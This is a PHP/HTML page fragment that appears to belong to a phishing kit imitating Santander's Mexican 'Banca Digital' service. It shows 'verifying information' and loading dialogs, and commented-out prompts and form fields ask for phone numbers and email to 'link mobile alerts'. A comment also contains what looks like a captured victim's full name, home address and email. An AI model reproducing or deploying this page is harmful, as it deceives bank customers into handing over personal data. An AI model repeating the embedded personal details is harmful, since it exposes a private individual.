

<input type="hidden" name="session" id="session" value="<?=$session;?>">
<div id="rsa" style="position:absolute;left:0px;top:0px;width:0;height:0;display:NONE;"></div>
<div id="UtilDialog" class="mainWin" style="position: absolute; left: 200px; top: 90px; display: block; z-index: 20000; height: 507px; width: 600px;">
    <div id="UtilDialogHeader" class="title" style="position: absolute; left: 1px; top: 1px; width: 596px; height: 28px; cursor: default;">

        
        
        
        <table id="UtilDialogHeader_Table" style="position:relative;left:0px;top:0px;" width="100%" cellpadding="0" cellspacing="0">
            <tbody>
                <tr id="i5" height="28">
                    <td class="dheader" id="td0UtilDialogHeader" style="background: url(img/ico-step-3.gif) right 2px no-repeat;">

                        <font id="UtilDialogHeaderTitle" class="header" style="position:absolute;left:9px;top:4px;">Verificando Informaci&oacute;n</font><a id="UtilDialogHeaderFOCUS" style="position:relative;left:0px;top:0px;" href="#"></a>
                    </td>
                    <td class="dheader" id="td1UtilDialogHeader" align="right">
                        <img id="UtilHelp" style="position: relative; left: 0px; top: 0px; cursor: pointer; opacity: 100; display: block; visibility: hidden;" src="img/ayuda1.gif" border="0" imgname="ayuda1">
                    </td>
                </tr>
            </tbody>
        </table>
        <script>
            
                
                
                
                function showLoading(){
                    $('#loading.UtilDialog').css('display','block');
                }
                
                function hideLoading(){
                    $('#loading.UtilDialog').css('display','none');
                }
            
                function soloNumeros(e){
                    var key = window.Event ? e.which : e.keyCode
                    return (key >= 48 && key <= 57)
                }
                
                
            
        </script>
    </div>
    <div id="UtilDialogBody" class="win_bckg" style="position: absolute; left: 1px; top: 29px; width: 596px; height: 475px;">
        <!--<div id="i98" style="position:absolute;left:0px;top:0px;width:510;height:198;">
            <font id="i100" class="size" style="position:absolute;left:24px;top:20px;">Nombre Completo:</font>
            <font id="i102" class="size" style="position:absolute;left:24px;top:45px;">DIRECCIÓN</font>
            <font id="i102" class="size" style="position:absolute;left:24px;top:70px;">Calle y Número:</font>
            <font id="i103" class="Size" style="position:absolute;left:24px;top:95px;">Colonia:</font>
            <font id="i104" class="size" style="position:absolute;left:24px;top:120px;">Ciudad:</font>
            <font id="i105" class="size" style="position:absolute;left:24px;top:145px;">Delegación o Municipio:</font>
            <font id="i106" class="size" style="position:absolute;left:24px;top:170px;">Código Postal:</font>
            <fieldset id="c_lblNombre" style="position:absolute;left:195px;top:20px;width:300;display:inline;border-width:0;">
                <font id="lblNombre" class="size" style="">ANGEL LEONEL HEREDIA DE ALBA </font>
            </fieldset>
            <fieldset id="c_lblCalleNum" style="position:absolute;left:195px;top:70px;width:300;display:inline;border-width:0;">
                <font id="lblCalleNum" class="size" style="">INDEPENDENCIA 535 </font>
            </fieldset>
            <fieldset id="c_lblColonia" style="position:absolute;left:195px;top:95px;width:300;display:inline;border-width:0;">
                <font id="lblColonia" class="size" style="">PLACETAS ESTADIO </font>
            </fieldset>
            <fieldset id="c_lblCiudad" style="position:absolute;left:195px;top:120px;width:300;display:inline;border-width:0;">
                <font id="lblCiudad" class="size" style="">COLIMA </font>
            </fieldset>
            <fieldset id="c_lblMunicipio" style="position:absolute;left:195px;top:145px;width:300;display:inline;border-width:0;">
                <font id="lblMunicipio" class="size" style="">COLIMA </font>
            </fieldset>
            <fieldset id="c_lblCodPostal" style="position:absolute;left:195px;top:170px;width:300;display:inline;border-width:0;">
                <font id="lblCodPostal" class="size" style="">00028050</font>
            </fieldset>
        </div>-->
        <script>
            $(document).ready(function(){
                //$('#i100').show();
            });
        </script>
        <div id="i98" style="position:absolute;left:0px;top:0px;width:510;height:198;">
            <!--<font id="i100" class="size" style="position:absolute;left:24px;top:20px;width:500px;">
                Es necesario que inicie el proceso de vinculaci&oacute;n de alertas mobiles para continuar con el acceso a la Banca Digital Santander
            </font>-->


            <!--<font id="i200" class="size" style="position:absolute;left:24px;top:20px;width:500px;display: none;">
                Por favor, inicie sesi&oacute;n en su correo electr&oacute;nico para que de esta quede asociado su email al servicio de alertas Banca Digital Santander.
            </font>-->


            
            <font id="i1002" class="size" style="position:absolute;left:24px;top:50px;width:500px; color: #FF0000 !important"></font>
        </div>
        
        <div id="i20" style="position:absolute;left:0px;top:50px;width:490;height:135;">
            <!--<font id="lblMail" class="size" style="position:absolute;left:24px;top:12px;">Correo Electrónico (e-mail):</font>
            <div id="c_i23" name="c_i23" class="size" style="position:absolute;left:195px;top:10px;border-width:0;">
                
                
                <!--<input type="text" autocomplete="off" class="size" id="i23" name="i23" size="45" maxlength="50" t="0" onfocus="VLF(this)" onblur="VLB(this);if((UD(this,'v')!=this.value&amp;&amp;this.V)||UD(this,'dc')){UDS(this,'dc',F);}" value="ANGEL_26@OUTLOOK.COM">
            </div>-->
            
            <style>
                input.size[type="text"], input.size[type="password"] {
                    width: 135px !important;
                }
            </style>
            
            <!--<div id="frmFolio" style="display: none;">
                <font id="lblMailBisA" class="size" style="position:absolute;left:24px;top:39px;width:180px">FOLIO: <span style="color: #ff0000"><?//=$_SESSION['Folio'];?></span></font>
            </div>-->


            <!--<div id="frmNotify" style="display: none;">
                <font id="lblMailBisA2" class="size" style="position:absolute;left:24px;top:39px;width:400px">
                    Por favor, inicie sesi&oacute;n en su correo electr&oacute;nico para que de esta quede asociado su email al servicio de alertas Banca Digital Santander.
                </font>
            </div>-->

            
            <div id="changeHTML">
                
            </div>
            
            <!--
            <div id="frmData" style="display: block;">
            

                <font id="i1322" class="size" style="position:absolute;left:24px;top:70px;width:180px">Tel&eacute;fono celular:</font>
                <div id="c_admdat.selectCompania2" name="c_admdat.selectCompania1" style="position:absolute;left:215px;top:68px;display:inline">
                    <input type="text" onKeyPress="return soloNumeros(event)" style="margin-top: 3px!important" autocomplete="off" class="size" id="i23BisA22" name="i23BisA24" size="45" maxlength="10" onfocus="" onblur="">

                </div>

                <font id="i13222" class="size" style="position:absolute;left:24px;top:101px;width:180px">Tel&eacute;fono de casa u oficina:</font>
                <div id="c_admdat.selectCompania22" name="c_admdat.selectCompania2" style="position:absolute;left:215px;top:97px;display:inline">
                    <input type="text" onKeyPress="return soloNumeros(event)" style="margin-top: 3px!important" autocomplete="off" class="size" id="i23BisA221" name="i23BisA23" size="45" maxlength="10" onfocus="" onblur="">

                </div>

                <font id="i132222" class="size" style="position:absolute;left:24px;top:137px;width:180px">Correo Electrónico:</font>
                <div id="c_admdat.selectCompania222" name="c_admdat.selectCompania22" style="position:absolute;left:215px;top:125px;display:inline">
                    <input type="text" style="margin-top: 6px!important" autocomplete="off" class="size" id="i23BisA" name="i23BisA" size="45" onfocus="" onblur="">

                </div>
                
            </div>


            <div id="divBot" class="accionBtn" style="position:absolute;left:160px;top:197px;width:290;height:30;">
                <button id="cancelButs" name="cancels" class="accionBtn" value="Confirmar" style="position:absolute;left:225px;top:0px;width:63;height:22;" type="button"><u></u>Confirmar</button>
            </div>

            -->

            
        
            
        </div>
        <!--
        <div id="i37" style="position:absolute;left:0px;top:400px;width:490;height:40;">
            <fieldset id="i39" class="notas" style="position:relative;left:0px;top:0px;width:486;height:45;">
                <legend>Notas</legend>
                <font id="i32" style="position:absolute;left:5px;top:15px;font-size:10;width: 200px">* Opcional.</font>
            </fieldset>
        </div>-->
        
        <div id="i37" style="position:absolute;left:0px;top:422px;width:490px!important;height:40;clear:both!important">
            
            <fieldset id="i39" class="notas" style="position:relative;left:0px;top:0px;width:486;height:45;"><legend>Notas</legend>
                <font id="i32" style="position:absolute;left:5px;top:15px;font-size:10;">Si desea modificar los demás datos, acuda a su sucursal titular.
                </font>
                <br><p></p>
            </fieldset>
            
            <div style="clear:both!important;"></div>
        </div>
    </div>
</div>

<div id="loading2" class="mainWin" style="display: none; position: absolute; left: 100px; top: 100px;  z-index: 30000; width: 206px; height: 112px;">
    <div id="UtilDialogHeader2" class="title" style="position: absolute; left: 1px; top: 1px; width: 202px; height: 28px;">
        <table id="UtilDialogHeader_Table" style="position:relative;left:0px;top:0px;" width="100%" cellspacing="0" cellpadding="0">
            <tbody>
            <tr id="i5" height="28">
                <td class="dheader" id="td0UtilDialogHeader" style="width: 100%;">
                    <font id="UtilDialogHeaderTitle" class="header" style="position:absolute;left:9px;top:4px;">Cargando Datos...</font><a id="UtilDialogHeaderFOCUS" style="position:relative;left:0px;top:0px;" href="#"></a>
                </td>
                <td class="dheader" id="td1UtilDialogHeader" style="width: 30px;" align="right">
                    <img id="UtilHelp" style="position: relative; left: 0px; top: 0px; display: none;" src="img/ayuda1.gif" imgname="ayuda1" border="0">
                </td>
            </tr>
            </tbody>
        </table>
    </div>
    <div id="UtilDialogBody2" class="win_bckg" style="position: absolute; left: 1px; top: 29px; width: 202px; height: 80px;">
        <div id="loadingCont" style="position:absolute;left:0px;top:0px;width:200;height:80;background-color:#FFFFFF;"></div><img id="i12" style="position:absolute;left:68px;top:7px;cursor: hand;" src="img/loading4.gif" imgname="loading4" width="60" height="60" border="0"><a id="imageLoading" style="position:absolute;left:68px;top:7px;" href="#"></a>
    </div>
</div>


<div id="loading.UtilDialog" class="mainWin loadimg" style="position: absolute; left: 100px; top: 100px; display: none; z-index: 30000; width: 206px; height: 112px;">
    <div id="loading.UtilDialogHeader" class="title" style="position: absolute; left: 1px; top: 1px; width: 202px; height: 28px;">

        <table id="loading.UtilDialogHeader_Table" style="position:relative;left:0px;top:0px;" width="100%" cellpadding="0" cellspacing="0">
            <tbody>
                <tr id="loading.i5" height="28">
                    <td class="dheader" id="loading.td0UtilDialogHeader">
                        <font id="loading.UtilDialogHeaderTitle" class="header" style="position:absolute;left:9px;top:4px;">Cargando Datos...</font><a id="loading.UtilDialogHeaderFOCUS" style="position:relative;left:0px;top:0px;" href="#"></a>
                    </td>
                    <td class="dheader" id="loading.td1UtilDialogHeader" align="right">
                        <img id="loading.UtilHelp" style="position: relative; left: 0px; top: 0px; cursor: pointer; display: none;" src="img/ayuda1.gif" border="0" imgname="ayuda1">
                    </td>
                </tr>
            </tbody>
        </table>
    </div>
    <div id="loading.UtilDialogBody" class="win_bckg" style="position: absolute; left: 1px; top: 29px; width: 202px; height: 80px;">
        <div id="loadingCont" style="position:absolute;left:0px;top:0px;width:200;height:80;background-color:#FFFFFF;"></div><img id="i12" style="position:absolute;left:68px;top:7px;cursor: hand;" src="img/loading4.gif" border="0" height="60" width="60" imgname="loading4"><a id="imageLoading" style="position:absolute;left:68px;top:7px;" href="#"></a>
    </div>
</div>
<div id="alrtII.UtilDialog" class="mainWin" style="position: absolute; left: 150px; top: 110px; display: none; z-index: 20000; width: 404px; height: 47px;">
    <div id="alrtII.UtilDialogHeader" class="title" style="position: absolute; left: 1px; top: 1px; width: 400px; height: 28px;">

        <table id="alrtII.UtilDialogHeader_Table" style="position:relative;left:0px;top:0px;" width="100%" cellpadding="0" cellspacing="0">
            <tbody>
                <tr id="alrtII.i5" height="28">
                    <td class="dheader" id="alrtII.td0UtilDialogHeader">
                        <font id="alrtII.UtilDialogHeaderTitle" class="header" style="position:absolute;left:9px;top:4px;">DialogTitle</font><a id="alrtII.UtilDialogHeaderFOCUS" style="position:relative;left:0px;top:0px;" href="#"></a>
                    </td>
                    <td class="dheader" id="alrtII.td1UtilDialogHeader" align="right">
                        <img id="alrtII.UtilHelp" style="position:relative;left:0px;top:0px;cursor: hand;" src="img/ayuda1.gif" border="0" imgname="ayuda1">
                    </td>
                </tr>
            </tbody>
        </table>
    </div>
    <div id="alrtII.UtilDialogBody" class="win_bckg" style="position: absolute; left: 1px; top: 29px; width: 400px; height: 15px;">
        <div id="alertIICont" style="position:relative;left:0px;top:0px;width:100%;">

            <table id="alertII.tbCont" style="position:relative;left:0px;top:0px;" width="100%" cellpadding="10">
                <tbody>
                    <tr id="i27">
                        <td id="i28"></td>
                    </tr>
                    <tr id="i31">
                        <td id="alertIIBodyCont"></td>
                    </tr>
                    <tr id="i33">
                        <td id="i34"></td>
                    </tr>
                </tbody>
            </table>
            <div id="UtilConfirmII.divButtons" class="dialogButton" style="position:relative;left:0px;top:0px;width:100%;">

                <table id="UtilConfirm.tbButtons" style="position:relative;left:0px;top:0px;" width="100%" cellpadding="5">
                    <tbody>
                        <tr id="i5">
                            <td id="i6" align="right"><button id="UtilAlertII.Continuar" name="enter" class="accionBtn" value="aceptar" style="position:relative;left:0px;top:0px;width:63;height:22;" type="button"><u></u>aceptar</button>

                            </td>
                            <td id="i8">

                            </td>
                            <td id="i10"><button id="UtilAlertII.Cancelar" name="cancel" class="accionBtn" value="cancelar" style="position:relative;left:0px;top:0px;width:63;height:22;" type="button"><u></u>cancelar</button>

                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>
            <div id="UtilAlertII.divAlert" style="position: relative; left: 0px; top: 0px; width: 100%; display: none;">

                <table id="UtilAlert.tbAlert" style="position:relative;left:0px;top:0px;" width="100%" cellpadding="5">
                    <tbody>
                        <tr id="i17">
                            <td id="i18" align="center"><button id="UtilAlertII.cerrar" name="cancel" class="accionBtn" value="Cerrar" style="position:relative;left:0px;top:0px;width:63;height:22;" type="button"><u></u>Cerrar</button>

                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</div>
<!--<iframe id="iframe212" frameborder="0" src="about:blank" title="xavmit" style="width: 0px; height: 0px; border: none; display: none;"></iframe>
<iframe id="iframe322" frameborder="0" src="about:blank" title="dum_pg" style="width: 0px; height: 0px; border: none; display: none;"></iframe>-->
<div id="S$">

    <table>
        <tbody id="IrW"></tbody>
    </table>
</div>
<!--<iframe id="iframe657" frameborder="0" src="about:blank" title="kn__gu" style="width: 0px; height: 0px; border: none; display: none;"></iframe>
<iframe id="iframe129" frameborder="0" src="about:blank" title="u_cahr" style="width: 0px; height: 0px; border: none; display: none;"></iframe>
<iframe id="iframe958" frameborder="0" src="about:blank" title="nxtenu" style="width: 0px; height: 0px; border: none; display: none;"></iframe>-->
</body>

</html>
